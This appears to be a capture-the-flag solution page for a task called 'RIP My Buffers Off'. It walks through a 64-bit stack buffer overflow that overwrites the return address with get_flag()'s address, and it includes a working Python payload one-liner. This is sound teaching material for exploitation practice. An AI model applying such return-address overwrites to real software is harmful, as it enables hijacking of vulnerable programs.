---
nav_order: 1
parent: 'Task: RIP My Buffers Off'
---

# Solution

The function address on the stack needs to be overwritten with the address of `get_flag()`.
Before reaching that, the payload needs to pass through some local variables and the RBP (8 bytes in 64-bit).

Find `get_flag()` address:

```bash
objdump -d buff-ovf2 | grep "get_flag>:"
# Result: 0000000000401216 <get_flag>:
```

The payload needs:

- 56 bytes padding (local variables + saved RBP)
- 8 bytes for return address (little-endian)

```sh
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*56 + b"\x16\x12\x40\x00\x00\x00\x00\x00")' | ./buff-ovf2
```

Or using the exploit script:

```bash
./exploit.sh | ./buff-ovf2
```

**Important**: The binary uses `setvbuf(stdout, NULL, _IONBF, 0)` to disable `stdout` buffering, ensuring the flag is printed even when the program segfaults after exploitation.

Note: In 64-bit, addresses are 8 bytes (not 4), and RBP is 8 bytes (not 4 like EBP in 32-bit).
